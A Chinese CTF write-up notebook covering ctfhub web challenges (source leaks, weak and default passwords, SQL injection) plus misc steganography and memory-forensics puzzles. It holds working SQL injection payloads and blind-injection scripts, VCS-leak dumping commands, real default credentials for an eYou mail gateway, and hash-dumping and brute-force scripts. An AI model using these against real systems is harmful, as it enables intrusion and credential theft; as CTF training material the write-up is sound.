---
typora-root-url: img
typora-copy-images-to: img
---



# ctfhub技能树

## web

### 信息泄露

#### 备份文件下载

###### 网站源码

![image-20200716094257999](image-20200716094257999.png)

![image-20200716094257999](image-20200716095008916.png)

![image-20200716095107957](image-20200716095107957.png)

![image-20200716095117049](image-20200716095117049.png)

![image-20200716095121336](image-20200716095121336.png)

![image-20200716095126413](image-20200716095126413.png)

###### bak文件

![image-20200716095237344](image-20200716095237344.png)

![image-20200716095244422](image-20200716095244422.png)

![image-20200716095248467](image-20200716095248467.png)

![image-20200716095252960](image-20200716095252960.png)

###### vim缓存

![image-20200716095317941](image-20200716095317941.png)

![image-20200716095333386](image-20200716095333386.png)

![image-20200716095338926](image-20200716095338926.png)

![image-20200716095354810](image-20200716095354810.png)

###### .DS_Store

![image-20200716095542096](image-20200716095542096.png)

![image-20200716095550945](image-20200716095550945.png)

发现一个路径提示：

![image-20200716095601652](image-20200716095601652.png)

![image-20200716095608571](image-20200716095608571.png)

#### Git泄露

###### Log

![image-20200716110150963](image-20200716110150963.png)

![image-20200716110210284](image-20200716110210284.png)

![image-20200716110226537](image-20200716110226537.png)

###### Stash

![image-20200716110305535](image-20200716110305535.png)

![image-20200716110439869](image-20200716110439869.png)

![image-20200716110503295](image-20200716110503295.png)

###### Index

![image-20200716110631159](image-20200716110631159.png)

![image-20200716110757120](image-20200716110757120.png)

#### SVN泄露

![image-20200716110934610](image-20200716110934610.png)

![image-20200716113738148](image-20200716113738148.png)

![image-20200716113759280](image-20200716113759280.png)

#### HG泄露

![image-20200716114911519](image-20200716114911519.png)

```python
link = 'http://challenge-ad97e51c040516fb.sandbox.ctfhub.com:10080'
import os
os.system('./rip-git.pl -v -u %s/.git/'%link)
os.system('./rip-hg.pl -v -u %s/.hg/'%link)
os.system('./rip-svn.pl -v -u %s/.svn/'%link)
os.system('./rip-cvs.pl -v -u %s/CVS/'%link)
os.system('./rip-git.pl -m -o /dir -v -u %s/.git/'%link)
```

![image-20200716115716225](image-20200716115716225.png)

![image-20200716120039002](image-20200716120039002.png)

![image-20200716120049766](image-20200716120049766.png)

### 密码口令

#### 弱口令

抓包：

```
POST / HTTP/1.1
Host: challenge-177b09f032f3bbb0.sandbox.ctfhub.com:10080
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 35
Origin: http://challenge-177b09f032f3bbb0.sandbox.ctfhub.com:10080
Connection: close
Referer: http://challenge-177b09f032f3bbb0.sandbox.ctfhub.com:10080/
Upgrade-Insecure-Requests: 1

name=admin&password=passwd&referer=
```

常用的弱口令字典爆破不出来，尝试用账号+三位数字的形式爆破得到密码admin666

#### 默认口令

给了个亿邮邮件网关的登录界面，该系统的默认口令有：

| 账号     | 密码         |
| -------- | ------------ |
| eyouuser | eyou_admin   |
| eyougw   | admin@(eyou) |
| admin    | +-ccccc      |
| admin    | cyouadmin    |

挨个试得到flag

### SQL注入

#### 整数型注入

![image-20200906212224767](/image-20200906212224767.png)

```
-1 union select 1,2-- -
-1 union select 1,database()-- -
-1 union select 1,group_concat(schema_name) from information_schema.schemata
-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()-- -
-1 union select 1,group_concat(column_name) from information_schema.columns where table_name='flag'-- -
-1 union select 1,(select flag from flag)-- -
```

#### 字符型注入

```
-1' union select 1,database()
-1' union select 1,group_concat(schema_name) from information_schema.schemata#
-1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()-- -
-1' union select 1,group_concat(column_name) from information_schema.columns where table_name='flag'-- -
-1' union select 1,(select flag from flag)-- -
```

#### 报错注入

```
1 and updatexml(1,concat(0x23,database()),1) -- -
1 and updatexml(1,concat(0x23,(select group_concat(table_name) from information_schema.tables where table_schema=database())),1) -- -
1 and updatexml(1,concat(0x23,(select group_concat(column_name) from information_schema.columns where table_name='flag')),1) -- -
1 and updatexml(1,concat(0x23,(select flag from flag)),1) -- -
1 and updatexml(1,concat(0x23,(select (right(flag,30)) from flag)),1) -- -
```

#### 布尔盲注

```python
import string
import requests

_str = string.ascii_letters
_str += '0123456789{}'
print(_str)
t_r = ''
url = "http://challenge-92e2f40df1c2ecaf.sandbox.ctfhub.com:10080/?id=1 and (ascii(substr((select(flag)from(flag))from(%d)))=%d)"
for i in range(60):
    print(i)
    for s in _str:
        _url = url%(i,ord(s))
        # print(_url)
        result = requests.get(_url).text
        if 'query_success' in result:
            t_r = t_r + s
            print(t_r)
            break
```

#### 时间盲注

```python
import string
import requests
import time

_str = string.ascii_letters
_str += '0123456789{}'
print(_str)
t_r = ''
url = "http://challenge-9720e816fe751e8a.sandbox.ctfhub.com:10080/?id=1 and if((ascii(substr((select(flag)from(flag))from(%d)))=%d), sleep(5), 1)"
for i in range(60):
    i = i+1
    print(i)
    for s in _str:
        _url = url%(i,ord(s))
        # print(_url)
        try:
            s_time =time.time()
            result = requests.get(_url).text
        except:
            time.sleep(10)
            s_time =time.time()
            result = requests.get(_url).text
        e_time = time.time()
        if e_time - s_time >= 5:
            t_r = t_r + s
            print(t_r)
            break
```

#### MySQL结构

```
-1 union select 1,2-- -
-1 union select 1,database()-- -
-1 union select 1,group_concat(schema_name) from information_schema.schemata
-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()-- -
-1 union select 1,group_concat(column_name) from information_schema.columns where table_name='tfsaqkjjtg'-- -
-1 union select 1,(select aorboajuqp from tfsaqkjjtg)-- -
```

#### Cookie注入

cookie有个字段id，在这里注入就行

```
-1 union select 1,2-- -
-1 union select 1,database()-- -
-1 union select 1,group_concat(schema_name) from information_schema.schemata
-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()-- -
-1 union select 1,group_concat(column_name) from information_schema.columns where table_name='advsnncsmp'-- -
-1 union select 1,(select sqenkipnmw from advsnncsmp)-- -
```

#### UA注入

```python
import requests

url = "http://challenge-c7b95089c5357e9c.sandbox.ctfhub.com:10080/"
# headers = {'User-Agent':'-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()-- -'}
# headers = {'User-Agent':"-1 union select 1,group_concat(column_name) from information_schema.columns where table_name='eekmsqwypr'-- "}
headers = {'User-Agent':"-1 union select 1,(select tvzmnnngkj from eekmsqwypr)-- -"}
result = requests.get(url, headers=headers).text
print(result)
```

#### Refer注入

```
import requests

url = "http://challenge-101ab3be57f06d83.sandbox.ctfhub.com:10080/"
# headers = {'referer':'-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()-- -'}
# headers = {'referer':"-1 union select 1,group_concat(column_name) from information_schema.columns where table_name='gwapapdfpi'-- "}
headers = {'referer':"-1 union select 1,(select yjxljrovns from gwapapdfpi)-- -"}
result = requests.get(url, headers=headers).text
print(result)
```

#### 过滤空格

```
-1/**/union/**/select/**/1,2#
-1/**/union/**/select/**/1,group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()#
-1/**/union/**/select/**/1,group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name='geasbiejso'#
-1/**/union/**/select/**/1,(select/**/dbjzzvxhkb/**/from/**/geasbiejso)#
```



# 2020福建培训

## 杂项

### 压缩包

###### 1.compress-word

![image-20200716164331294](/image-20200716164331294.png)

伪加密先处理下

解压得到的文件改后缀名为rar后解压得到flag图片：

![image-20200716164432881](/image-20200716164432881.png)

###### 3.compress-Basic-08

![image-20200716164533951](/image-20200716164533951.png)

![image-20200716164538247](/image-20200716164538247.png)

![image-20200716164542987](/image-20200716164542987.png)

![image-20200716164547243](/image-20200716164547243.png)

###### 8.ompress-laiba

![image-20200716164648942](/image-20200716164648942.png)

![image-20200716164652840](/image-20200716164652840.png)

明文攻击：

![image-20200716164700944](/image-20200716164700944.png)

![image-20200716164705424](/image-20200716164705424.png)

后面一堆空格不要忘了

###### 2.Basic-07

给了一张二维码

![u5bc6u7801u7eafu6570u5b57u5171u0038u4f4d](/u5bc6u7801u7eafu6570u5b57u5171u0038u4f4d.png)

扫描发现没东西，有个密码提示

![image-20200716164943539](/image-20200716164943539.png)

![image-20200716170000371](/image-20200716170000371.png)

这里感觉是双关，flag是路由器密码；计算器，估计密码是纯数字的意思？

改后缀名得到压缩包，但是解压需要密码

![image-20200716165011943](/image-20200716165011943.png)

![image-20200716165133810](/image-20200716165133810.png)

纯数字爆破得到密码

![image-20200716170114958](/image-20200716170114958.png)

流量包是802.11

![image-20200716170242762](/image-20200716170242762.png)

txt文件提示密码

![image-20200716170157200](/image-20200716170157200.png)

写个脚本生成字典

```python
import string

strs = string.ascii_uppercase
strs += string.digits

a = open(r'C:\Users\hp430\Desktop\dict.txt', 'w')
head = 'ISCC'
for i1 in strs:
    for i2 in strs:
        for i3 in strs:
            for i4 in strs:
                _str = head + i1 + i2 + i3 + i4 + '\n'
                a.write(_str)
a.close()
```

丢到Aircrack-ng里面爆破，需要爆挺久的

![image-20200717102139512](/image-20200717102139512.png)

 根据提示，这题要求提供wifi密码，即flag为flag{ISCC16BA}

###### 4..zip

给了个压缩包，上来就要密码，点开压缩包发现描述里面藏有东西

![image-20200716171818399](/image-20200716171818399.png)

复制出来看下，感觉像摩斯密码

![image-20200716171950033](/image-20200716171950033.png)

转换一下

![image-20200716172112050](/image-20200716172112050.png)

解码获得解压密码

![image-20200716172233638](/image-20200716172233638.png)

解压得到一张图片

![女神](/女神.png)

用cloacked-pixel爆破得到flag

```python
import os
pass_file = open('pass.txt', 'r')
for pwd in pass_file.readlines():
    os.system('python lsb.py extract 女神.png flag %s'%pwd)
    try:
        result = open('flag', 'r').read()
        if '{' in result:
            print(pwd)
            break
    except:
        pass
```

![image-20200717104628995](/image-20200717104628995.png)

![image-20200717104643368](/image-20200717104643368.png)

###### 6.misc400

![image-20200723171915264](/image-20200723171915264.png)

![image-20200723171932788](/image-20200723171932788.png)

zip文件，应该不是明文攻击，估计是套娃解压

尝试文件名解压不行，看样子有点像md5，猜测密码是md5前的字符串，脚本爆破之：

```python
import zipfile
import re
import os
import subprocess

import hashlib

def get_pwd(md5_r):
    for i in range(0, 100000000):
        if hashlib.md5(bytes(str(i), encoding='utf-8')).hexdigest() == md5_r:
            return(str(i))

file_dir = r'C:\Users\hp430\Desktop\6.misc400\\'
get_files = []

# ts1.getinfo('data.txt').CRC
while True:
    get = False
    for i in os.listdir(file_dir):
        if i not in get_files:
            if i.endswith('.txt'):
                continue
            get = True
            ts1 = zipfile.ZipFile(file_dir + i)
            passwd = get_pwd(i.split('.')[0])
            print(passwd)
            ts1.extractall(file_dir,pwd=bytes(passwd, encoding='utf-8'))
            # cmd = '"D:\\Program Files\\7-Zip\\7z.exe" x %s%s -o"%s" -p%s' % (file_dir, i, file_dir, passwd)
            # subprocess.Popen(cmd)
            zipname = file_dir + ts1.namelist()[0]
            get_files.append(i)
    if not get:
        break
```

最后得到一个txt文件和一个假的exe文件：

![image-20200724085307011](/image-20200724085307011.png)

![image-20200724085410308](/image-20200724085410308.png)

![image-20200724085525896](/image-20200724085525896.png)

aes加密，密码是aes+模式，各种尝试后发现是aesecb：

![image-20200724090830443](/image-20200724090830443.png)

![image-20200724090846055](/image-20200724090846055.png)



base64解码出来的结果不对，根据文件名五年计划.exe猜测要先rot13（现在是第十三个五年规划），最后base64解码得到一张图片

![image-20200724091504617](/image-20200724091504617.png)

```python
a = 'base64内容太长了就不贴进来了'

import base64
v = base64.b64decode(a)
f = open('test.jpg', 'wb')
f.write(v)
f.close()
```

![test](/test.jpg)

属性中发现flag：

![image-20200724091551367](/image-20200724091551367.png)



###### 7.test

![image-20200724101824510](/image-20200724101824510.png)

![image-20200724101849501](/image-20200724101849501.png)

一堆文件+大小较小，crc32爆破，最后得到base64，解码下得到一个文件

```python
import string
import os
import zipfile
import binascii
import base64

_str = string.ascii_letters
_str += string.digits
_str += '+=/'

a = ''

def test_crc32(result):
    for i1 in _str:
        for i2 in _str:
            for i3 in _str:
                for i4 in _str:
                    test_str = i1+i2+i3+i4
                    if binascii.crc32(test_str.encode()) == result:
                        return test_str

file_dir = r'C:\Users\hp430\Desktop\test\\'
print('start')
for i in range(0,68):
    print(i)
    ts1 = zipfile.ZipFile(file_dir + 'out' + str(i) + '.zip')
    crc = ts1.getinfo('data.txt').CRC
    a += test_crc32(crc)
    print(a)
v = base64.b64decode(a)
f = open(r'C:\Users\hp430\Desktop\test.rar', 'wb')
f.write(v)
f.close()
```

无法打开，查看16进制内容明显是rar文件，补全526172211A0700文件头

![image-20200724112703113](/image-20200724112703113.png)

注释中发现flag

![image-20200724112818031](/image-20200724112818031.png)

###### 10.recover.rar

给了一张图片：

![answer](/answer.jpg)

后缀名改为rar解压得到一个txt文件：

![image-20200731104100874](/image-20200731104100874.png)

![image-20200731104131632](/image-20200731104131632.png)

看起来像是base，提示32，用base32处理一下

![image-20200731104213013](/image-20200731104213013.png)

![image-20200731104239112](/image-20200731104239112.png)

开头是504B0304，应该是压缩包，怀疑进行了替换，格式化一下：

![image-20200731104501597](/image-20200731104501597.png)

进行替换恢复可以得到：

```
504B03040A000900000044490A477å8BB5F4120000000600000005000000662E7478741716518DC72E49DFB8DB31631B5DAEC42F90
504B07087E8BB5F41200000006000000
504B03040A000900000053490A47874AAA51200000006000000050000006C2E7478741716518DC72E49DFB8DB261BAA24C6A6CB3B
504B0708C874AAA51200000006000000
504B03040A000900000034620A4745D600C1120000000600000005000000612E7478741716518DC72E49DFB8DB414A032A257BE2F9
504B070845D600C11200000006000000
504B03040A00090000007D490A47642CBAEE120000000600000005000000672E7478741716518DC72E49DFB8DB080A066FF02FFEC5
504B0708642CBAEE1200000006000000
504B010214000A000900000044490A477E8BB5F41200000006000000050000000000000001002000000000000000662E747874
504B010214000A000900000053490A47874AAA512000000060000000500000000000000010020000000450000006C2E747874
504B010214000A000900000034620A4745D600C1120000000600000005000000000000000100200000008A000000612E747874
504B010214000A00090000007D490A47642CâAEE12000000060000000500000000000000010020000000CF000000672E747874
504B05060000000004000400CC000000140100000000
```

部分恢复不了的全部替换为0，然后用winhex保存为rar文件：

![image-20200731110217335](/image-20200731110217335.png)

![image-20200731110231031](/image-20200731110231031.png)

crc32爆破，要很久，最后得到flag

### 其他杂项

###### 2.01-sound1.wav

![image-20200724225244977](/image-20200724225244977.png)

![image-20200724225254122](/image-20200724225254122.png)

e5353bb7b57578bd4da1c898a8e2d767

###### 2.csaw.pdf

![image-20200724225335345](/image-20200724225335345.png)

用pdf编辑器删掉图片即可

![image-20200724225425146](/image-20200724225425146.png)

###### 1._music

1.安洵杯 music

![image-20200724230029994](/image-20200724230029994.png)

![image-20200724230052084](/image-20200724230052084.png)

mp3+密码，果断使用MP3Stego

![image-20200724230245708](/image-20200724230245708.png)

![image-20200724230322510](/image-20200724230322510.png)

解压得到一个wav文件，SilentEye得到flag：

![image-20200724230954160](/image-20200724230954160.png)

###### 1.2017-actorshow

2017年第三届陕西省网络空间安全技术大赛-actorshow

给了一个mp4文件和一个wav文件：

![image-20200731171204408](/image-20200731171204408.png)

wav文件明显是摩斯密码，解码得到CTFSECWAR2017

![image-20200731171814516](/image-20200731171814516.png)

作为密码，用OurSecret解密mp4文件得到flag

![image-20200731172029311](/image-20200731172029311.png)

![image-20200731172044179](/image-20200731172044179.png)

###### 1.2333.pdf

foremost得到三个图片文件：

![image-20200731173049835](/image-20200731173049835.png)

其中一个有flag：

![00000160](/00000160.jpg)

###### 2.Watchword

Csaw-ctf-2016-quals:Watchword

给了一个mp4文件，strings发现一个base64，解码发现是个网址，猜测使用Steghide进行解密

![image-20200731174907368](/image-20200731174907368.png)

![image-20200731174932661](/image-20200731174932661.png)

foremost得到一张图片：

![image-20200731175558451](/image-20200731175558451.png)

![00001069](/00001069.png)

stepic得到一张jpg图片：

```
python stepic.py -d -i 00001069.png > 2.jpg
```

![image-20200731180540983](/image-20200731180540983.png)

![2 (3)](/2 (3).jpg)

steghide得到一个base64，密码用的是password

```
steghide extract -sf 2.jpg -p password
```

![image-20200731181701717](/image-20200731181701717.png)

其中内容：

W^7?+dsk&3VRB_4W^-?2X=QYIEFgDfAYpQ4AZBT9VQg%9AZBu9Wh@|fWgua4Wgup0ZeeU}c_3kTVQXa}eE

一看就不是真的base64，检测下：

```python
s = 'W^7?+dsk&3VRB_4W^-?2X=QYIEFgDfAYpQ4AZBT9VQg%9AZBu9Wh@|fWgua4Wgup0ZeeU}c_3kTVQXa}eE'

s_len = len(set(s))
print('使用了{0}个字符，至少为base{0}，请参考《base全家桶的安装使用方法》解题'.format(s_len))
```

![image-20200731182046340](/image-20200731182046340.png)

最后发现用base85可以得到flag：

```python
s = 'W^7?+dsk&3VRB_4W^-?2X=QYIEFgDfAYpQ4AZBT9VQg%9AZBu9Wh@|fWgua4Wgup0ZeeU}c_3kTVQXa}eE'

import base64
print(base64.b85decode(s))
```

![image-20200731182306298](/image-20200731182306298.png)

###### 3..pdf

发现空白图片

![image-20200802191735945](/image-20200802191735945.png)

删掉后发现二维码

![image-20200802191816680](/image-20200802191816680.png)

![image-20200802191853187](/image-20200802191853187.png)

###### 3.music-ACTF

music-ACTF新生赛

给了一个m4a文件，发现无法播放，检查16进制数据发现文件头不对

![image-20200806161507865](/image-20200806161507865.png)

m4a文件的文件头是00 00 00 20 66 74 79 70 4D 34 41 20 00 00 00 00，应该是进行了异或或者增减的处理，尝试异或0xA1后得到可以播放的文件：

```python
import  zlib, base64
f1 = open(r'C:\Users\hp430\Desktop\3.music-ACTF\tmp\vip\vip.m4a', 'rb')
s = f1.read()
s1 = b''
for i in s:
    s1 += chr(ord(i)^0xa1)
f2 = open(r'C:\Users\hp430\Desktop\3.music-ACTF\tmp\vip\vipa.m4a','wb')
f2.write(s1)
f2.close()
```

播放听到flag为actfabcdfghijk

###### 3.SECCON_WARS_2015

视频播放的时候看中间这块很像二维码：

![image-20200806162707122](/image-20200806162707122.png)

首先按帧提取出来：

```python
import cv2
import os
video_path = r'C:\Users\hp430\Desktop\3.SECCON_WARS_2015.mp4'
times=0
#提取视频的频率，每１帧提取一个
frameFrequency=1
#输出图片到当前目录vedio文件夹下
outPutDirName = r'C:\Users\hp430\Desktop\new\\'
if not os.path.exists(outPutDirName):
    #如果文件目录不存在则创建目录
    os.makedirs(outPutDirName)
camera = cv2.VideoCapture(video_path)
while True:
    times+=1
    res, image = camera.read()
    if not res:
        print('not res , not image')
        break
    if times%frameFrequency==0:
        cv2.imwrite(outPutDirName + str(times)+'.jpg', image)
        print(outPutDirName + str(times)+'.jpg')
print('图片提取结束')
camera.release()
```

要看到二维码需要把图片合并在一起，首先要删掉开头和结尾部分的无意义部分，然后用convert进行合并，由于帧太多了选取部分合并即可

 ```
convert 10??.jpg -background none -compose lighten -flatten output.jpg
 ```

![output (2)](/output (2).jpg)

![image-20200806170029562](/image-20200806170029562.png)

###### 4.inctf_2018_winter_sport

binwalk发现有7z文件

![image-20200806171730776](/image-20200806171730776.png)

把35A.zlib文件复制出来，后缀名改为7z后解压得到一个pdf文件：

![image-20200806171843588](/image-20200806171843588.png)

snow解密得到flag：

```
SNOW -C omg.pdf
```

![image-20200806172721707](/image-20200806172721707.png)

###### 5.SecurityFest2017_-_Empty.pdf

strings发现数字串：

![image-20200807101326508](/image-20200807101326508.png)

转个码即可得到flag：

```python
s = '83 67 84 70 123 115 116 114 52 110 103 51 95 111 98 106 51 99 116 95 99 104 114 95 49 110 95 112 108 52 49 110 95 115 49 116 51 125'
s = s.split(' ')
for i in s:
    print(chr(int(i)), end = '')
```

![image-20200807101638732](/image-20200807101638732.png)

###### 6.wbsteg.pdf

wbStego直接得到flag：

![image-20200807102417469](/image-20200807102417469.png)

![image-20200807102430865](/image-20200807102430865.png)

![image-20200807102402603](/image-20200807102402603.png)

###### 11.disco

普通的disco

在开头发现有奇怪的东西（需要放大很多，很容易漏掉）

![image-20200811174958718](/image-20200811174958718.png)

开头有个上面的别漏了。上面是1，下面是0可以得到：

```
110011011011001100001110011111110111010111011000010101110101010110011011101011101110110111011110011111101
```

长度是105，105=3x5x7，猜测不是4位一组补零就是8位一组补零，按照8位补0得到：

```python
s = '110011011011001100001110011111110111010111011000010101110101010110011011101011101110110111011110011111101'
num = 7
add = 1
result = ''
for i in range(int(len(s)/num)):
    result += '0'*add
    result += s[i*num:i*num+7]
print(result)
```

```
011001100110110001100001011001110111101101010111001100000101011100101010011001100111010101101110011011100111100101111101
```

8位一组转字符串得到flag：

```python
a = '011001100110110001100001011001110111101101010111001100000101011100101010011001100111010101101110011011100111100101111101'

num = 2 #原始数据进制

for _len in range(8):
    use_len = _len + 1
    if len(a) % use_len != 0:
        continue
    s = ''
    for i in range(int(len(a)/use_len)):
        v = a[i*use_len:(i+1)*use_len]
        s += chr(int(v, num))
    print(s)
```

```
flag{W0W*funny}
```

###### girlfriend

```
I want a girl friend !!!
将结果用wctf2020{}再提交
```

给了个wav文件，听了下发现是手机按键音，dtmf2num提取一下：

![image-20200813171523331](/image-20200813171523331.png)

对照手机键盘九宫格即可提取flag：

![手机键盘九宫格](/手机键盘九宫格.jpg)

```
wctf2020{youaremygirlfriends}
```

###### 14.music

Audacity查看波形放大后发现只有两种高度：

![image-20200813172301532](/image-20200813172301532.png)

估计不是2进制就是4进制，写个脚本提取一下：

```python
# -*- coding: utf-8 -*-
from scipy.io import wavfile

filename = r'C:\Users\hp430\Desktop\14.music.wav'
sample_rate, sig = wavfile.read(filename)
print("采样率: %d" % sample_rate)
result = ''
tmp = []
for index, s in enumerate(sig):
    if index == 0 or index >= len(sig)-1:
        continue
    if s < 0: 
        if tmp:
            if max(tmp) > 20000:
                result += '1'
            else:
                result += '0'
            tmp = []
    else:
        tmp.append(s)


num = 2 #原始数据进制
s = hex(int(result, num))[2:]
print(s)
```

winhex得到一个rar文件，ntfs流发现文件：

![image-20200813183106280](/image-20200813183106280.png)

![image-20200813183245089](/image-20200813183245089.png)

半截二维码，010editor改高度后扫码得到flag：

![image-20200813183349028](/image-20200813183349028.png)

### 取证

#### 内存取证

###### 1.Administrators_secret

查看系统版本：

```
volatility -f mem.dump imageinfo
```

![image-20200814101212086](/image-20200814101212086.png)

查看进程列表：

```
volatility -f mem.dump --profile=Win7SP1x64 pslist
```

![image-20200814101354823](/image-20200814101354823.png)

CnCrypt的后缀名为ccx，搜索一下文件：

```
volatility -f mem.dump --profile=Win7SP1x64 filescan | findstr .ccx
```

![image-20200814101857568](/image-20200814101857568.png)

导出文件：

```
volatility -f mem.dump --profile=Win7SP1x64 dumpfiles -Q 0x000000003e435890 -D ./ -u
```

把导出的文件的名称改为flag.ccx，接下来需要找到密码。

尝试下系统密码，首先查看注册表：

```
volatility -f mem.dump --profile=Win7SP1x64 hivelist
```

![image-20200814102558934](/image-20200814102558934.png)

导出密码：

```
volatility -f mem.dump --profile=Win7SP1x64 hashdump -y 0xfffff8a000024010 -s 0xfffff8a001590010 > hashs.txt
```

```
Administrator:500:6377a2fdb0151e35b75e0c8d76954a50:0d546438b1f4c396753b4fc8c8565d5b:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

md5爆破0d546438b1f4c396753b4fc8c8565d5b得到密码ABCabc123

CnCrypt得到flag：flag{now_you_see_my_secret}

![image-20200814104153862](/image-20200814104153862.png)

###### 2.Advertising_for_Marriage

看信息：

```
volatility -f "Advertising for Marriage.raw" imageinfo
```

![image-20200814105113740](/image-20200814105113740.png)

看进程：

```
volatility -f "Advertising for Marriage.raw" --profile=WinXPSP2x86 pslist
```

![image-20200814105532838](/image-20200814105532838.png)

导出进程：

```
volatility ‐f "Advertising for Marriage.raw" ‐‐profile=WinXPSP2x86 memdump ‐p 1056 ‐‐dump‐dir=./
volatility ‐f "Advertising for Marriage.raw" ‐‐profile=WinXPSP2x86 memdump ‐p 332 ‐‐dump‐dir=./
```

notepad进程发现提示：

![image-20200814110949353](/image-20200814110949353.png)

GIMP发现PJCX，由于是反的应该是b1cx，合起来是是b1cxneedmoneyandgirlfirend

![image-20200814112359189](/image-20200814112359189.png)

文件搜索发现图片：

```
volatility -f "Advertising for Marriage.raw" --profile=WinXPSP2x86 filescan|findstr .png
```

![image-20200814112745131](/image-20200814112745131.png)

导出：

```
volatility -f "Advertising for Marriage.raw" --profile=WinXPSP2x86 dumpfiles -Q 0x000000000249ae78 -D ./
```

![image-20200814113254622](/image-20200814113254622.png)

修复下高度：

```
import struct
import binascii
misc = open(r"C:\Users\hp430\Desktop\a.png","rb").read()

for i in range(100000): 
    # data = misc[12:16] + struct.pack('>i',i)+ misc[20:29] #爆破宽度
    data = misc[12:20] + struct.pack('>i',i)+ misc[24:29] #爆破高度
    crc32 = binascii.crc32(data) & 0xffffffff
    if crc32 == 0xB80A1736: 
        print(i)
```

高度是211，010editor修改。

cloacked-pixel用b1cxneedmoneyandgirlfirend得到一串base

![image-20200814115646668](/image-20200814115646668.png)

![image-20200814115754119](/image-20200814115754119.png)

回去看修复后的图片，也有一个1417，猜测二者是对应的，即明文开头是flag：

![image-20200814120339621](/image-20200814120339621.png)

把开头的flag当做明文，用维吉尼亚解密gnxt得到bcxn：

```python
key='flag'

ciphertext='gnxt'


#key='relations'

#ciphertext='ksmehzbblk'

key = key.lower()
ascii='abcdefghijklmnopqrstuvwxyz'

keylen=len(key)

ctlen=len(ciphertext)
# for _ in ciphertext:
#     if _ not in ascii:
#         ctlen -= 1

plaintext = ''

i = 0
down = 0

while i < ctlen:
    if ciphertext[i] not in ascii:
        plaintext += ciphertext[i]
        down += 1
        i += 1
        continue

    j = (i-down) % keylen

    k = ascii.index(key[j])

    m = ascii.index(ciphertext[i])

    if m < k:

        m += 26

    plaintext += ascii[m-k]

    i += 1


print(plaintext)
```

hint是b1cxneedmoneyandgirlfirend，和bcxn相比少了个1，去掉1当做key后用上面那个脚本得到flag

```
flagisd7f1417bfafbf62587e0
```

###### 4.ez_memusb

ez_mem&usb

给了流量包，观察发现上传了一个很大的zip文件，导出解压得到data.vmem

![image-20200821095313396](/image-20200821095313396.png)

![image-20200821095417152](/image-20200821095417152.png)

```
volatility -f "data.vmem" imageinfo
```

WinXPSP2x86

```
volatility -f "data.vmem" --profile=WinXPSP2x86 pslist
```

发现cmd.exe

```
volatility -f "data.vmem" --profile=WinXPSP2x86 cmdscan
```

![image-20200821100212031](/image-20200821100212031.png)

既然给了passwd就找下有没有压缩包，volatility搜索文件没找打，使用foremost找到了压缩文件：

```
foremost -T data.vmem
```

![image-20200821100923374](/image-20200821100923374.png)

解压得到：

![image-20200821101136063](/image-20200821101136063.png)

提取usb数据得到flag：

```python
'''
tshark -r usb1.pcapng -T fields -e usb.capdata > usbdata.txt
'''
mappings = { 0x04:"A",  0x05:"B",  0x06:"C", 0x07:"D", 0x08:"E", 0x09:"F", 0x0A:"G",  0x0B:"H", 0x0C:"I",  0x0D:"J", 0x0E:"K", 0x0F:"L", 0x10:"M", 0x11:"N",0x12:"O",  0x13:"P", 0x14:"Q", 0x15:"R", 0x16:"S", 0x17:"T", 0x18:"U",0x19:"V", 0x1A:"W", 0x1B:"X", 0x1C:"Y", 0x1D:"Z", 0x1E:"1", 0x1F:"2", 0x20:"3", 0x21:"4", 0x22:"5",  0x23:"6", 0x24:"7", 0x25:"8", 0x26:"9", 0x27:"0", 0x28:"\n", 0x2a:"[DEL]",  0X2B:"    ", 0x2C:" ",  0x2D:"-", 0x2E:"=", 0x2F:"[",  0x30:"]",  0x31:"\\", 0x32:"~", 0x33:";",  0x34:"'", 0x36:",",  0x37:"." }
nums = []
keys = open(r'C:\Users\hp430\Desktop\usbdata.txt')
for line in keys:
    if line[0]!='0' or line[1]!='0' or line[3]!='0' or line[4]!='0' or line[9]!='0' or line[10]!='0' or line[12]!='0' or line[13]!='0' or line[15]!='0' or line[16]!='0' or line[18]!='0' or line[19]!='0' or line[21]!='0' or line[22]!='0':
         continue
    nums.append(int(line[6:8],16))
keys.close()
output = ""
for n in nums:
    if n == 0 :
        continue
    if n in mappings:
        output += mappings[n]
    else:
        output += '[unknown]'
print 'output :\n' + output
```

```
output :
FLAG[69200835784EC3ED8D2A64E73FE913C0]
```

###### 5.forensic

```
volatility -f "5.forensic.raw" imageinfo
```

Win7SP1x86

```
volatility -f "5.forensic.raw" --profile=Win7SP1x86 pslist
```

发现TrueCrypt、notepad、mspaint、Dumpit.exe

导出notepad、mspaint、Dumpit.exe，

```
volatility -f "5.forensic.raw" --profile=Win7SP1x86 memdump -p 3524 --dump-dir=./
volatility -f "5.forensic.raw" --profile=Win7SP1x86 memdump -p 3620 --dump-dir=./
volatility -f "5.forensic.raw" --profile=Win7SP1x86 memdump -p 3380 --dump-dir=./
```

其中，notepad、mspaint没啥有用信息，Dumpit.exe内存导出后用foremost可以得到一个压缩文件，里面有个flag.txt，需要密码。

搜索文件，发现一张可疑图片

```
volatility -f "5.forensic.raw" --profile=Win7SP1x86 filescan|findstr /e /i ".png"
```

![image-20200821152931232](/image-20200821152931232.png)

```
volatility -f "5.forensic.raw" --profile=Win7SP1x86 dumpfiles -Q 0x000000001efb29f8 -D ./
```

![image-20200821153104673](/image-20200821153104673.png)

用1YxfCQ6goYBD6Q作为密码解压得到flag：

![image-20200821153312941](/image-20200821153312941.png)

###### 7.Keyboard

```
volatility -f "Keyboard.raw" imageinfo
```

Win7SP1x64 

```
volatility -f "Keyboard.raw" --profile=Win7SP1x64 pslist
```

VeraCrypt.exe

```
volatility -f "Keyboard.raw" --profile=Win7SP1x64 filescan|findstr txt
```

